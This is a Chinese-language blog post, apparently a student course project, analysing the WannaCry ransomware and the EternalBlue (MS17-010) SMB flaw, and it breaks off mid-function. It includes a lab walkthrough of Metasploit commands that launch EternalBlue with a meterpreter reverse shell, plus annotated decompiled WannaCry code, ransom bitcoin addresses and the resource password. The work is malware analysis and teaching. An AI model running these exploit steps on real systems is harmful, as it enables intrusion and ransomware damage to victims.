---
title: WannaCry 的具体的细节的分析
date: 2020-12-30 08:05:34
tags: [network,virus]
description: 大作业
---

本文是针对WannaCry 的具体的细节的分析

[REFERENCE](https://bbs.pediy.com/thread-249520.htm)

<!--more-->

# WannaCry 病毒分析

### Virus Analysis Of WannaCry

[TOC]

### 引 言

本次大作业主要对WannaCry病毒的行为和具体代码的实现逻辑进行分析，之前有一些前辈已经对病毒大体情况做出了相关的分析。本次大作业将会利用现有能找到的前人的所有分析进行汇总细化，并结合至今为止病毒的变种情况，进行针对事实与现金情况的逻辑，变种和防范方法分析，通过依照事实的分析，解答大家对病毒的疑问和误解

本次大作业的亮点在于：

1.  通过了病毒发作到现在的沉淀，病毒的具体行为和变种也经过了发展和沉淀，通过综合能得到更适合现在的方法

2.  通过对病毒变种的分析，分析病毒的演变情况，了解病毒在发作之后可能会有什么样的改变

3.  通过基于事实的推测，推翻大众对病毒误解，对病毒有基于科学的认识。

 ## 1 病毒概况

2017年5月12日，本文所分析的勒索病毒WannaCry借助高危漏洞"永恒之蓝"（EternalBlue）在全世界范围内快速传播。世界范围内的很多国家，包括俄罗斯、西班牙、意大利、越南、美国、英国、中国、等百余个国家的企业和医院等机构收到大幅度的破环。与此同时，我国的许多行业机构和大型企业也被攻击，有的单位甚至"全军覆没"，造成了近期罕见的损失。

本报告将从传播途径、危害方式和结果、受威胁用户群等角度，逐一厘清这个恶性病毒方方面面的真相，用以帮助大家认识、解决该病毒，防范未来可能出现的变种病毒，同时澄清一些谣传和谎言。

### 1.1 病毒攻击行为及危害


遭受WannaCry病毒侵害的电脑，其文件将被加密锁死，病毒开发者提供了一个比特币账号供支付赎金打开锁死的文件，但根据病毒源码的分析，受害者可能永远的失去了这些文件。WannaCry病毒的设计就明确的表明了病毒
和
病毒作者不能得知受害者是否支付的了赎金，且病毒并不包含用于解码的神奇数，所以即使支付了赎金，大概率也不能得到恢复密钥

网上流传的"解密方法"只是"文件恢复工具"，可以恢复一些被删除的文件，但是作用有限。这是因为据病毒源码分析，文件的加密过程是加密后再删除原始文件，文件恢复工具可能可以恢复删除的原始文件。但是病毒对于文件的操作是十分频繁的，删除文件所保存的数据块可能会被覆盖，而且随着病毒执行时间的增加，恢复的可能性会逐渐降低。

### 1.2 传播途径和攻击方式

WannaCry由蠕虫+勒索病毒构成，蠕虫传播和释放自己，后者负责加密文件。

蠕虫：蠕虫病毒是一种常见的计算机病毒。通过网络和电子邮件进行传播，具有自我复制和传播迅速等特点。此次病毒制造者正是利用了美国国家安全局(NSA)
泄漏的Windows
SMB远程漏洞利用工具"永恒之蓝"来进行传播的。据悉，蠕虫代码运行后先会连接域名：hxxp: //www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
如果该域名可以成功连接，则直接停止。而如果上述域名无法访问，则会安装病毒服务，在局域网与外网进行传播。

但是无论这个"神奇开关"是否开启，该病毒都会攻击用户，锁死文件。另外，这个开关程序很容易被病毒制造者去除，因此未来可能出现没有开关的变种病毒。

### 1.3 易受攻击用户群

大型企业和公共设施占收到攻击的主机的大多数，个人用户受攻击较少。接下来，将从两个方面说明易受攻击用户群的特点

操作系统：首先，该病毒只攻击Windows系统的电脑，几乎所有的Windows系统如果没有打补丁，都会被攻击。而Windows
Vista、Windows Server 2008、Windows 7、Windows Server 2008 R2、Windows
8.1、Windows Server 2012、Windows Server 2012 R2、Windows Server 2016
版本，用户如果开启了自动更新或安装了对应的更新补丁，可以抵御该病毒。Windows10是最安全的，由于其系统是默认开启自动更新的，所以不会受该病毒影响。同时，Unix、Linux、Android等操作系统，也不会受到攻击。

网络结构：目前这个病毒通过共享端口传播同时在公网及内网进行传播，直接暴露在公网上且没有安装相应操作系统补丁的计算机有极大风险会被感染，而通过路由拨号的个人和企业用户，则不会受到来自公网的直接攻击

# 2 永恒之蓝漏洞

## 2.1 漏洞情况说明

### 2.1.1 漏洞简介

永恒之蓝漏洞是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机的系统漏洞

漏洞代码： MS17-010

### 2.1.2 漏洞影响

2017年4月14日晚，影子经纪人黑客组织将永恒之蓝漏洞在互联网上公开后。在之后的五个月中，该漏洞被多款恶意软件利用。包括WannaCry，无文件的勒索软件UIWIX和SMB蠕虫EternalRocks。

EternalBlue(在微软的MS17-010中被修复)是在Windows的SMB服务处理SMB
v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。

## 2.2 SMB协议

### 2.2.1 简介

SMB（全称是Server Message
Block）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。

### 2.2.2 工作原理

（1）：首先客户端发送一个SMB negport
请求数据报，，并列出它所支持的所有SMB的协议版本。服务器收到请求消息后响应请求，并列出希望使用的SMB协议版本。如果没有可以使用的协议版本则返回0XFFFFH，结束通信。

（2）：协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送SessetupX请求数据包实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个SessetupX应答数据包来允许或拒绝本次连接

（3）：当客户端和服务器完成了磋商和认证之后，它会发送一个Tcon或TconX
SMB数据报并列出它想访问的网络资源的名称，之后会发送一个TconX应答数据报以表示此次连接是否接收或拒绝。

（4）：连接到相应资源后，SMB客户端就能够通过open
SMB打开一个文件，通过read SMB读取文件，通过write SMB写入文件，通过close
SMB关闭文件。

## 2.3 溢出分析

### 2.3.1 概述

漏洞出现在`Windows SMB v1`中的内核态函数`srv!SrvOs2FeaListToNt`在处理FEA(File Extended Attributes)转换时，在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)上存在缓冲区溢出。函数`srv!SrvOs2FeaListToNt`在将FEA list转换成`NTFEA`(Windows NT FEA) list前会调用`srv!SrvOs2FeaListSizeToNt`去计算转换后的`FEA lsit`的大小。然后会进行如下操作：

1.srv!SrvOs2FeaListSizeToNt会计算FEA list的大小并更新待转换的FEA list的大小

2.因为错误的使用WORD强制类型转换，导致计算出来的待转换的FEA list的大小比真正的FEA list大

3.因为原先的总大小计算错误，导致当FEA list被转化为NTFEA list时，会在非分页池导致缓冲区溢出

## 2.4 漏洞的利用

### 2.4.1 情况说明

漏洞代码工作在内核的非分页内存中。也可以工作在大非分页池中。这些类型的池都没有在页的开始嵌入任何头部。因此需要特殊的技巧来利用这些漏洞。这些技巧需要逆向一些数据结构

### 2.4.2 利用过程

EternalBlue首先发送一个SRVbuffer除了最后一个数据包。这是因为大非分页池将在会话中最后一个数据包被服务端接收的时候被建立。SMB服务器会把会话中接受到的数据读取并叠加起来放入输入缓冲区中。所有的数据会在TRANS包中被标明。当接收到所有的数据 SMB服务器将会处理这些数据。数据通过CIFS(Common Internet File System)会被分发到SrvOpen2函数中来读取。

EternalBlue发送的所有数据会被SMB服务器收到后，SMB服务器会发送SMB ECHO包。因为攻击可以在网速很慢的情况下实现，所以SMB ECHO是很重要的。

在我们的分析中，即使我们发送了初始数据，存在漏洞的缓冲区仍然没有被分配在内存中。

1.FreeHole_A: EternalBlue通过发送SMB v1数据包来完成占位

2.SMBv2_1n: 发送一组SMB v2数据包

3.FreeHole_B: 发送另一个占位数据包；必须确保第一个占位的FreeHole_A被释放之前，这块内存被分配

4.FreeHole_A_CLOSE: 关闭连接，使得第一个占位的内存空间被释放

5.SMBv2_2n: 发送一组SMB v2数据包

6.FreeHole_B_CLOSE: 关闭连接来释放缓冲区

7.FINAL_Vulnerable_Buffer: 发送最后的数据包，这个数据包将会被存储在有漏洞的缓冲区中

有漏洞的缓冲区（之前SRVNET创建的）被填入的数据将会覆盖和部分SRVNET的缓冲区。在FEA
list转换到NTFEA
list时会发生错误，因为FEA结构会在覆盖SRVNET缓冲区之后失效，所以服务器将以STATUS_INVALID_PARAMETER（0xC000000D）返回。

## 2.5 漏洞攻击

### 2.5.1 准备工作

准备两台虚拟机，一台kali-linux 一台 win7，使用Wireshark
进行抓包，利用msfconsole工具进行模拟攻击

### 2.5.2 攻击过程

1.获取两台主机的IP地址

2.测试两台主机的连通性

3.使得 kali 的数据保持开启

测试是否开启： service postgresql status

打开数据库 ： service postgresql start

初始化数据库： msfdb init

4.利用 msfconsole 进行漏洞扫描

启动： msfconsole

查看数据库连接情况：db_status

搜索漏洞： search ms17_010

扫描命令：use auxiliary/scanner/smb/smb_ms17_010

攻击命令（后面使用）：use exploit/windows/smb/ms17_010_eternalblue

设置扫描的主机或者主机段：set rhosts 192.168.223.141/24;

设置扫描线程为20： set threads 20；

最后输入run执行扫描。

同时，利用 wireshark抓包工具，监听ethO

进行攻击：use exploit/windows/smb/ms17_010_eternalblue

设置攻击目标（靶机）：set rhost 192.168.223.141

设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp

设置监听主机（kali）：set lhost 192.168.223.137

利用exploit进行攻击：exploit

成功攻击！！

{% asset_img image1.png 1 %}

图1 打开并初始化数据库

{% asset_img image2.png 2 %}

图2 打开msfconsole 并查找ms17_010

# 4 病毒分析

## 4.1 基础静态分析

### 4.1.1 查壳

第一步防止开发者对病毒进行了包装，对病毒进行查壳操作，以下是查壳结果

{% asset_img image3.jpeg 3 %}

图一：Exeinfo查壳

通过 Lamer info字段的Not packed，我们知道病毒无壳，省去了脱壳的麻烦

### 4.1.2 字符串分析

利用IDA工具中提供的 Strings Window
工具，我们可以查找病毒源文件中含有的显式的字符串，这一步能帮我们对病毒的大致功能和加密方式等由大致的了解。

{% asset_img image4.jpeg 4 %}

图二：病毒的字符串信息

通过字符串分析，我们大致了解了，病毒可能利用了RSA和AES
的加密方式，同时和 TaskStart 函数，t.wnry
,tasksche.exe等文件有很大的关联关系，还利用了CMD调用了某些参数。

### 4.1.3 识别加密算法

通过 Kyrpto ANAlyzer 插件识别病毒文件的加密算法

{% asset_img image5.jpeg 5 %}

图四： 识别加密算法

经过分析得知，病毒使用了 CRC32 和 AES 加密算法，CryptDecrypt 和
CryptEncrypt 是微软提供的加密类库，ZIP2和ZLIB 是压缩算法

### 4.1.4 查看导入表

通过PEiD提供的输入表查看器，对病毒源文件的输入表进行查看，探寻病毒。

{% asset_img image6.jpeg 6 %}

图五：查看病毒输入表

在Kernel32中发现病毒利用了LoadResource，LockResource等函数，表明了病毒资源段中可能藏有病毒需要利用的其他文件

{% asset_img image7.jpeg 7 %}

图六：病毒输入表-注册表操作

病毒利用了ADVAPI32.dll中的RegCreateKeyW，RegSetValueExA等函数，代表病毒源码中涉及了对注册表的操作，可以在病毒执行完后对注册表进行比较。

### 4.1.5 提取资源段

通过输入表的分析，我们了解到病毒exe的资源段中可能隐藏着病毒所拥有的其他资源文件，为此，我们对资源文件进行提取。

{% asset_img image8.jpeg 8 %}

图七：资源段查看

从资源段分析来看，XIA资源段最值得我们关注，在资源段中我们发现资源段头的PK字段，判断该资源段应该是rar的压缩文件，我们将资源段提取出来

{% asset_img image9.jpeg 9 %}

图八：XIA资源段

发现了隐藏在病毒资源段的文件 其中msg中是一些语言包

## 4.2 基础动态分析

### 4.2.1 进程分析

使用 ProcessMonitor 查看进程树

{% asset_img image10.png 10 %}

图九：进程树

Wcry.exe总共拥有5个子进程，其中cmd负责执行一些批处理文件

### 4.2.2 注册表分析

使用Regshot 比较病毒执行前后的注册表变化

{% asset_img image11.jpeg 11 %} 

{% asset_img image12.jpeg 12 %}

图十：regshot结果

通过Regshot的比对，我们发现病毒增加了一些加解密需要的密钥注册表项和自动运行的病毒路径位置

### 4.2.3 文件监控

下面我们利用火绒剑抓取病毒运行过程中病毒文件对于文件的更改，

{% asset_img image13.jpeg 13 %}

图十一：文件监控

通过对文件的监控，我们发现文件在病毒文件夹里放置了

Pky，eky，res 文件，应该是病毒所需要的公钥，私钥等文件

Bat 文件，是病毒所需要执行的繁杂的重复性的工作

Vbs 文件，应该是病毒执行时的中间文件，用于执行感染操作

{% asset_img image14.jpeg 14 %}

图十二：文件行为监控

继续进行文件行为的监控，监控到文件在自己的路径释放解压文件的操作，印证了我们之前对于资源段的分析。

### 4.2.4 感染效果

在病毒感染后，分析病毒感染的结果：

{% asset_img image15.jpeg 15 %}

图十三：感染病毒文件

可以看到，病毒在每个文件夹下新建了一个@Please_Read_Me@.txt和 @WanaDecryptor@.exe用于要求用户支付解锁账户，并将其他文件加密为以.WNCRY的文件

### 4.2.5 网络监控

{% asset_img image16.png 16 %}

图十四：网络连接情况

通过分析病毒释放的文件 taskhsvc.exe
的联网情况，我们看到病毒一直在对49159和9050端口进行监听，并利用端口尝试对局域网内的一些IP进行渗透。

# 5 wncry.exe 病毒主程序分析


## 5.1 主体逻辑

```c
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)  {  

Filename = byte_40F910;  

memset(&v12, 0, 0x204u);                      // 初始化内存  

v13 = 0;  

v14 = 0;  

GetModuleFileNameA(0, &Filename, 0x208u);     // 获取当前进程的完整路径  

GetRandom((int)RandResult);                   // 获取一串随机的字母+数字  

if ( *(_DWORD *)_p___argc(Str) != 2           // 如果命令行参数个数不等于2  

|| (v5 = _p___argv(), strcmp(*(const char )(*(_DWORD *)v5 + 4), aI))  

|| !sub_401B5F(0)  

|| (CopyFileA(&Filename, FileName, 0), GetFileAttributesA(FileName) == -1)  

|| !sub_401F5D() )  

{  

if ( strrchr(&Filename, '') )             // 查找在当前文件路径中的位置  

*strrchr(&Filename, '') = 0;  

SetCurrentDirectoryA(&Filename);            // 切换当前的工作目录  

SetReg(1);                                  // 设置当前进程目录到注册表项 

ReleaseFiles(0, ::Str);                     // 释放文件和语言包到工作路径下  

WriteCwnry();                               // 重写c.wnry文件 添加比特币账户  

ExeCmdCommand(CommandLine, 0, 0);           // 隐藏当前路径下的所有文件 

ExeCmdCommand(aIcaclsGrantEve, 0, 0);       // 添加Everyone用户 授予all访问权限  

if ( GetApis() )                            // 获取一些必要的API函数地址  

{  

CDatabase::CDatabase(this);               // 构造函数 初始化临界区  

if ( ImportKeyAndAllocMem(this, 0, 0, 0) )// 导入私钥并且分配两块固定内存  

{  

DecryptFileSize = 0;  

pFile = (void *)DecryptFile(this, t_wnry, (int)&DecryptFileSize);

// 从t.wnry中解密出一个dll文件  

if ( pFile )  

{  

pHeapBase = WriteAllocMem(pFile, DecryptFileSize);

// 申请一块堆空间 并把解密出的dll写入到堆空间 pHeapBase=dll->Nt头  

if ( pHeapBase )  

{  

TaskStartAddr = (void (__stdcall *)(_DWORD, _DWORD))GetExportFunAddr((int)pHeapBase, TaskStart);  

if ( TaskStartAddr )  // 从堆空间中取出dll导出函数的地址 并调用 

TaskStartAddr(0, 0);  

}  

}  

}  

CDatabase::~CDatabase((CDatabase *)this); // 析构函数 释放资源  

}  

}  

return 0;  

}  
```

通过对主题的完整注释我们大致了解了病毒所进行的主要操作，经总结为如下过程：

1.  初始化 内存，工作目录和随机数

2.  设置注册表项为当前进程目录

3.  释放资源包内的文件和语言包

4.  在c.wnry 内添加比特币账户

5.  隐藏当前路径下的文件

6.  进行加解密操作

7.  释放资源

以上过程能完整的展现出了病毒进行的操作，但是有一些操作由于参数设置错误，实际上没有实现。接下来我将对病毒的具体行为进行分析总共分为两个部分
第一部分 初始化操作 第二部分 加载病毒核心操作

## 5.2 初始化操作

初始化作为病毒文件的第一部分主要涉及几个函数
GetRandom获取随机数，SetReg设置注册表，ReleaseFiles
释放资源文件，我们将进行逐一的分析

### 5.2.1 GetRandom 获取随机数 

```c
int __cdecl GetRandom(int RandResult)  {  

GetComputerNameW(&ComputerName, &nSize);      // 获取计算机名  

i = 0;  

v1 = 1;  

if ( wcslen(&ComputerName) )                  // 如果计算机名的长度不为0  

{  

v2 = &ComputerName;  

do  

{  

v1 *= *v2;              // V1=[ComputerName]  即V1=计算机名的第一个字母的ASCII  

++i;                    // 下标自增  

++v2;                   // ComputerName++两次 即截断计算机名的第一个字母  

v3 = wcslen(&ComputerName);  

}  

while ( i < v3 );  }       // 循环次数i=strlen(Computer)   

srand(v1);                  // v1=计算机名所有ASCII的乘积  

v4 = 0;  

v5 = rand() % 8 + 8;  

if ( v5 > 0 )  

{  

do  

*(_BYTE *)(v4++ + RandResult) = rand() % 0x1A + 0x61;

// 随机取了一个字符串 假设：cecazrsga  

while ( v4 < v5 );  

}  

v6 = v5 + 3;  

while ( v4 < v6 )  

*(_BYTE *)(v4++ + RandResult) = rand() % 0xA + 0x30;// 随机取了一个数字122  

result = RandResult;  

*(_BYTE *)(v4 + RandResult) = 0;  

return result;   }  // 最后的结果等于两次随机结果拼在一起 cecazrsga122  
```

病毒首先获取计算机名ASCII码的连乘，并以其作为种子利用rand()函数得到一对字母+数字的随机数作为随机字符串

### 5.2.2 SetReg 设置注册表项

```c
signed int __cdecl SetReg(int a1) {    

wcscat(&Dest, Source);    
// 字符串拼接->SoftwareWanaCrypt0r   

v12 = 0;  

while ( 1 )  

{  

if ( v12 )  

RegCreateKeyW(HKEY_CURRENT_USER, &Dest, &hKey);  

else  

RegCreateKeyW(HKEY_LOCAL_MACHINE, &Dest, &hKey);// 创建了注册表项  

if ( hKey )  

{  

if ( a1 )  

{  

GetCurrentDirectoryA(0x207u, &Buffer);  // 获取当前的进程所在目录  

v1 = strlen(&Buffer);                   // 获取所在目录的长度  

v2 = RegSetValueExA(hKey, ValueName, 0, 1u, (const BYTE *)&Buffer, v1 + 1) == 0;// 将当前exe所在的路径设置为注册表项的值  

}  

else  

{  

cbData = 519;  

v3 = RegQueryValueExA(hKey, ValueName, 0, 0, (LPBYTE)&Buffer, &cbData);  

v2 = v3 == 0;  

if ( !v3 )  

SetCurrentDirectoryA(&Buffer);  

}  

RegCloseKey(hKey);  

if ( v2 )  

break;  

}  

if ( ++v12 >= 2 )  

return 0;  

}  

return 1;  

}  
```

可见病毒创建了一个注册表项
并将当前病毒主体所在位置的决定路径设置到注册表的
HKEY_LOCAL_MACHINESOFTWARE 下

### 5.2.3 ReleaseFiles 释放资源文件

```c
int __cdecl ReleaseFiles(HMODULE hModule, char *Str) {  

hRsrc = FindResourceA(hModule, (LPCSTR)0x80A, Type);

HRSRC = hRsrc;  

if ( !hRsrc )  

return 0;  

hGlobal = LoadResource(hModule, hRsrc);  

if ( !hGlobal )                               // 将资源载入到内存并锁定  

return 0;  

lpRes = LockResource(hGlobal);  

if ( !lpRes )  

return 0;  

ResourceSize = SizeofResource(hModule, HRSRC);

v7 = sub_4075AD(lpRes, ResourceSize, Str);    // str="WNcry@2017" 函数返回1||0  

if ( !v7 )  

return 0;  

v11 = 0;  

memset(&Str1, 0, 0x128u);  

SetReleasePath(v7, -1, (int)&v11);            // 将0x24放到内存中 v11=0x24  

v9 = v11;  

v10 = 0;  

if ( v11 > 0 )  

{  

do  

{  

SetReleasePath(v7, (int)v10, (int)&v11);  // 设置文件释放的路径 并保存到内存中  

if ( strcmp(&Str1, Str2) || GetFileAttributesA(&Str1) == -1 )

// 比较b.wnry和c.wnry  

ReleaseFile((int)v7, v10, &Str1);       // 释放文件到工作目录下  

++v10;  

}  

while ( (signed int)v10 < v9 );  

}  

FreeMemory(v7);                               // 做内存释放等扫尾工作  

return 1;  

}  
```

该函数的主要作用就是将资源包中的文件，利用解压密码"WNcry@1017"进行解压到当前进程的路径下，方便下面的操作进一步利用压缩包中的文件。

### 5.2.4 WriteCwnry 重写c.wnry

```c
int WriteCwnry()    {  

Source = a13am4vw2dhxygx;                  // 13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94

v5 = a12t9ydpgwuez9n;                      // 12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw  

v6 = a115p7ummngoj1p;                      // 115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn  

result = ReadOrWriteFileToMem(&DstBuf, 1);    // 读取c.wnry到内存中   

if ( result )    {  

v1 = rand();  

strcpy(&Dest, (&Source)[v1 % 3]);    // 拷贝随机账户到目标内存  

result = ReadOrWriteFileToMem(&DstBuf, 0);  // 写入c.wnry到内存  

}  

return result; }  
```

函数随机的将三个比特币账户中的一个写入c.wnry文件中

### 5.2.5 ExeCmdCommand 命令行执行

```c
int __cdecl ExeCmdCommand(LPSTR lpCommandLine, DWORD dwMilliseconds, LPDWORD lpExitCode)  

{  

struct _STARTUPINFOA StartupInfo; //该结构用于指定新进程的主窗口特性  

struct _PROCESS_INFORMATION ProcessInformation; // [esp+4Ch] [ebp-10h]  



StartupInfo.cb = 68;  

memset(&StartupInfo.lpReserved, 0, 0x40u);  

ProcessInformation.hProcess = 0;  

ProcessInformation.hThread = 0;  

ProcessInformation.dwProcessId = 0;  

ProcessInformation.dwThreadId = 0;  

StartupInfo.wShowWindow = 0;  

StartupInfo.dwFlags = 1;  

if ( !CreateProcessA(0, lpCommandLine, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation) )  

return 0;         // 设置当前目录下的所有文件属性为隐藏 命令行参数错误 函数并未成功  

if ( dwMilliseconds )                         // 条件不成立 跳转到关闭句柄处  

{  

if ( WaitForSingleObject(ProcessInformation.hProcess, dwMilliseconds) )  

TerminateProcess(ProcessInformation.hProcess, 0xFFFFFFFF);  

if ( lpExitCode )  

GetExitCodeProcess(ProcessInformation.hProcess, lpExitCode);  

}  

CloseHandle(ProcessInformation.hProcess);  

CloseHandle(ProcessInformation.hThread);  

return 1;  

}  
```

在函数主题逻辑中利用到了两次ExeCmdCommand函数：

第一个创建了一个进程 并利用参数"attrib+h"
将当前目录下的所有文件设置为隐藏

第二个利用参数 "icacls ./grant Everyone:F /T /C /Q"添加用户并给予权限

## 5.3 加载病毒核心操作

在这部分所涉及的函数的操作都只有一个目的，即利用dll文件中的导出函数，下面我们分步进行分析

### 5.3.1 GetApis 获取必要的API函数 

```c
unsigned int GetApis()  

{  

HMODULE KernelBase; // eax  

HMODULE KernelAddr; // edi  

FARPROC CloseHandle_Addr; // eax  

signed int result; // eax  



if ( !GetCryptoAPIAddr() )                    // 获取CryptoAPI函数地址  

goto LABEL_15;  

if ( CreateFileW_Addr )  

goto LABEL_16;  

KernelBase = LoadLibraryA(Kernel32);          // 加载Kernel32.dll的基址  

KernelAddr = KernelBase;  

if ( !KernelBase )  

goto LABEL_15;  

CreateFileW_Addr = (int)GetProcAddress(KernelBase, CreateFileW);

// 获取文件操作的API函数地址  

WriteFile_Addr = (int)GetProcAddress(KernelAddr, WriteFile_0);  

ReadFile_Addr = (BOOL (__stdcall *)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))GetProcAddress(  

KernelAddr,  

ReadFile_0);  

MoveFileW_Addr = (int)GetProcAddress(KernelAddr, MoveFileW);  

MoveFileExW_Addr = (int)GetProcAddress(KernelAddr, MoveFileExW);  

DeleteFileW_Addr = (int)GetProcAddress(KernelAddr, DeleteFileW);  

CloseHandle_Addr = GetProcAddress(KernelAddr, CloseHandle_0);  

Int_CloseHandle_Addr = (int)CloseHandle_Addr;  

if ( !CreateFileW_Addr )  

goto LABEL_15;  

if ( WriteFile_Addr && ReadFile_Addr && MoveFileW_Addr && MoveFileExW_Addr && DeleteFileW_Addr && CloseHandle_Addr )  

LABEL_16:  

result = 1;  

else  

LABEL_15:  

result = 0;  

return result;  

}  
```

此函数的主要目的就是为后面的操作获取常用API函数的地址例如-CreateFileW。

### 5.3.2 CDatabase::CDataBase 构造函数

```c
char *__thiscall CDatabase::CDatabase(_DWORD *this)  

{  

char *v1; // esi  



v1 = (char *)this;  

Crt_InitializeCriticalSection((char *)this + 4);// 初始化临界区对象  

Crt_InitializeCriticalSection(v1 + 44);  

return v1;  

}  
```

初始化两个用于线程同步的临界区对象CDatabase

### 5.3.3 ImportKeyAndAllocMem 导入密钥并申请空间

```c
int __thiscall ImportKeyAndAllocMem(_DWORD *this, LPCSTR FileName, int a3, int a4)  

{  

_DWORD *v4; // esi  

HGLOBAL hGlobal; // eax  

HGLOBAL hGlobal_2; // eax  



v4 = this;  

if ( !ImportPrivateKey(this + 1, FileName) )  // 导入私钥  

return 0;  

if ( FileName )  

ImportPrivateKey(v4 + 11, 0);  

hGlobal = GlobalAlloc(0, 0x100000u);          // 申请一块全局的固定内存块  

v4[306] = hGlobal;  

if ( !hGlobal )  

return 0;  

hGlobal_2 = GlobalAlloc(0, 0x100000u);  

v4[307] = hGlobal_2;  

if ( !hGlobal_2 )  

return 0;  

v4[309] = a3;  

v4[308] = a4;  

return 1;  

}  
```

这个函数完成了两项工作：

1.  导入 RSA 私钥，用来解密后面的相关文件

2.  申请了两块大小为 0x100000 的内存

### 5.3.4 DecryptFile 解密t.wnry

```c
int __thiscall DecryptFile(void this, LPCSTR lpFileName, int DecryptFileSize)  

{  

hFile = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);// 以只读的方式打开t.wnry  

if ( hFile != (HANDLE)INVALID_HANDLE_VALUE )  

{  

GetFileSizeEx(hFile, &FileSize);            // 获取文件大小  

if ( FileSize.QuadPart <= 0x6400000 )  

{  

if ( ReadFile_Addr(hFile, &lpBuffer, 8u, &lpNumberOfBytesRead, 0) )// 读取8个字节的文件内容 读取的内容为WANACRY!  

{  

if ( !memcmp(&lpBuffer, aWanacry, 8u) )  

{  

if ( ReadFile_Addr(hFile, &Buffer, 4u, &lpNumberOfBytesRead, 0) )// 继续向后读取4个字节的内容 读取的内容为0x100  

{  

if ( Buffer == 0x100 )  

{  

if ( ReadFile_Addr(hFile, pBuffer[306], 0x100u, &lpNumberOfBytesRead, 0) )// 读取0x100个字节  

{  

if ( ReadFile_Addr(hFile, &buff, 4u, &lpNumberOfBytesRead, 0) )// 再次读取4个字节 内容为04  

{  

if ( ReadFile_Addr(hFile, &buffer, 8u, &lpNumberOfBytesRead, 0) )// 继续往后读8字节->10000  

{  

if ( buffer <= 0x6400000 )  

{  

if ( DecryptData((int)(pBuffer + 1), (BYTE *)pBuffer[306], Buffer, &DecryptDatas, (int)&DataSize) )// 对读取的0x100个字节进行解密  

{  

sub_402A76((char *)pBuffer + 84, (int)&DecryptDatas, Src, DataSize, 0x10u);  

hGlobal_3 = (int)GlobalAlloc(0, buffer);  

if ( hGlobal_3 )  

{  

if ( ReadFile_Addr(hFile, pBuffer[306], FileSize.LowPart, &lpNumberOfBytesRead, 0)// 读取0x10000个字节  

&& lpNumberOfBytesRead  

&& (buffer < 0 || SHIDWORD(buffer) <= 0 && lpNumberOfBytesRead >= (unsigned int)buffer) )  

{  

pFileAddr = hGlobal_3;  

DecryptPEFile((int)(pBuffer + 21), pBuffer[306], hGlobal_3, lpNumberOfBytesRead, 1);// 将读取的内容解密成一个PE文件  

*(_DWORD *)DecryptFileSize = buffer;  

}  }  }  }  }  }  }  }  }  }  }  }  }  

local_unwind2((int)&ms_exc.registration, -1);  

return pFileAddr;                             // 返回解析出的文件首地址  

} 
```

在函数执行过程中，我们一直对t.wnry文件执行读取操作，每读取一个片段到内存边利用已有的RSA私钥进行解密，返回解密后的文件内容。

{% asset_img image17.png 17 %}

图十五：OD查看函数返回值

查看解密后的文件，是一个PE文件，通过对文件源码和结构的分析，判断它是一个dll文件，且是先前资源包中的t_wnry.dll。

### 5.3.5 WriteAllocMem 拷贝PE文件到内存

```c
int *__cdecl sub_4021E9(void *pFileBase, int FileSize, int VirtualAlloc_Addr, int VirtualFree_Addr, int LoadLibraryA_Addr, int GetProcAddress_Addr, int FreeLibrary_Addr, int a8)  

{  

v28 = 0;  

if ( !CmpFileSize(FileSize, 0x40u) )          // 比较文件大小是否大于等于0x40  

return 0;  

if ( *(_WORD *)pFileBase != 0x5A4D )          // 判断是否是PE文件  

goto LABEL_3;  

if ( !CmpFileSize(FileSize, *((_DWORD *)pFileBase + 0xF) + 0xF8) )// 比较文件大小是否大于等于0x1F0  

return 0;  

NtHeader = (char *)pFileBase + *((_DWORD *)pFileBase + 0xF);  

if ( *(_DWORD *)NtHeader != 0x4550 )          // 判断是否是PE文件  

goto LABEL_3;  

if ( *((_WORD *)NtHeader + 2) != 0x14C )      // 判断文件运行平台 0x14C代表I386  

goto LABEL_3;  

SectionAlignment = *((_DWORD *)NtHeader + 14);  

if ( SectionAlignment & 1 )                   // 判断内存对齐粒度  

goto LABEL_3;  

NumberOfSection = *((unsigned __int16 *)NtHeader + 3);  

if ( *((_WORD *)NtHeader + 3) )               // 判断区段数量  

{  

TextName = &NtHeader[*((unsigned __int16 *)NtHeader + 10) + 0x24];

// 取出SectionHeader[0]->name-----.text  

do  

{  

TextSize = *((_DWORD *)TextName + 1);     

// 取出SectionHeader[0]->SizeOfRawData-----0x6000  

TextVirtualAddress = *(_DWORD *)TextName; 

// 取出SectionHeader[0]->VirtualAddersss-----0x1000  

if ( TextSize )  

SectionHeader[1] = TextSize + TextVirtualAddress;

// 代码段的大小+代码段的起始地址=下一个区段的起始地址  

else  

SectionHeader[1] = SectionAlignment + TextVirtualAddress;  

if ( SectionHeader[1] > v28 )  

v28 = SectionHeader[1];  

TextName += 0x28;  

--NumberOfSection;  

}  

while ( NumberOfSection );                  // 遍历区段  

}  

hKernel32 = GetModuleHandleA(Kernel32);       // 获取Kernel32的基址  

if ( !hKernel32 )  

return 0;  

GetSystemInfo_Addr = (void (__stdcall *)(char *))((int (__cdecl *)(HMODULE, void (__stdcall *)(LPSYSTEM_INFO), _DWORD))GetProcAddress_Addr)、(hKernel32, GetNativeSystemInfo, 0);// 获取GetNativeSystemInfo函数地址  

if ( !GetSystemInfo_Addr )  

return 0;  

GetSystemInfo_Addr(&lpSystemInfo);            // 获取系统信息  

v17 = ~(v27 - 1);  

dwSize = v17 & (*((_DWORD *)NtHeader + 20) + v27 - 1);  

